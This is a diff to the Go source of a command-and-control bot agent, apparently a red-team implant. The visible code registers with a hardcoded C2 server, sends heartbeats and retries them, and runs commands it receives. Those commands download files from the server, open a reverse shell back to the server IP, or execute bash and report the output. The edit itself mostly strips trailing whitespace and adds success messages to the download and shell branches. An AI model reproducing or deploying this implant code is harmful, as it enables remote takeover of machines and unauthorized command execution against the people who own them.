@@ -34,7 +34,7 @@ var PORT string = "<PORT>"
 var FIRSTCONTACTKEY string = "dudeOurRedteamalreadyhaslike30C2already-Friend"
 var URL string = "http://" + SERVERIP + ":" + PORT
 
-var BOTID string 
+var BOTID string
 
 func GetOutboundIP() string {
 	conn, _ := net.Dial("udp", "8.8.8.8:80")
@@ -120,9 +120,9 @@ func register(registerkey string, ip string, os_name string, user string, pid st
 }
 
 /*
-	0 = connection failed 
-	1 = heartbeat successful 
-	2 = heartbeat failed 
+	0 = connection failed
+	1 = heartbeat successful
+	2 = heartbeat failed
 */
 func heartbeat(registerkey string, ip string, pid string) int {
 	endpoint := URL + "/heartbeat"
@@ -229,13 +229,13 @@ func executeCommand(command string) string {
 	if commandSlice[0] == "download" {
 		endpoint := URL + "/download/" + commandSlice[1]
 		download(endpoint, commandSlice[2])
-		return ""
+		return "[+] Download successful."
 
 		// Launch a reverse shell
 	} else if commandSlice[0] == "shell" {
 		port := commandSlice[1]
 		go reverseshell(SERVERIP, port)
-		return ""
+		return "[+] Reverse shell successful."
 
 		// Execute a simple bash command, and return the output to /result endpoint
 	} else {
@@ -271,7 +271,7 @@ func main() {
 				break
 			}
 
-			// implement later 
+			// implement later
 			//rand.Seed(time.Now().UnixNano())
 			//interval := rand.Intn((50-30+1) + 20)
 			time.Sleep(10 * time.Second)
@@ -299,7 +299,7 @@ func main() {
 	for {
 		heartbeat_result := heartbeat(registerkey, ip, pid)
 
-		// Heartbeat failed. Retry heartbeat for 30 minutes 
+		// Heartbeat failed. Retry heartbeat for 30 minutes
 		if heartbeat_result == 0 {
 			for i := 1; i < 180; i++ {
 				heartbeat_result := heartbeat(registerkey, ip, pid)
@@ -308,10 +308,10 @@ func main() {
 				}
 				time.Sleep(10 * time.Second)
 			}
-			
+
 			registerkey = firstContact()
 			_, botid := register(registerkey, ip, os_name, username, pid)
-			BOTID = botid 
+			BOTID = botid
 		}
 
 		// Everything is fine. Try to fetch command.
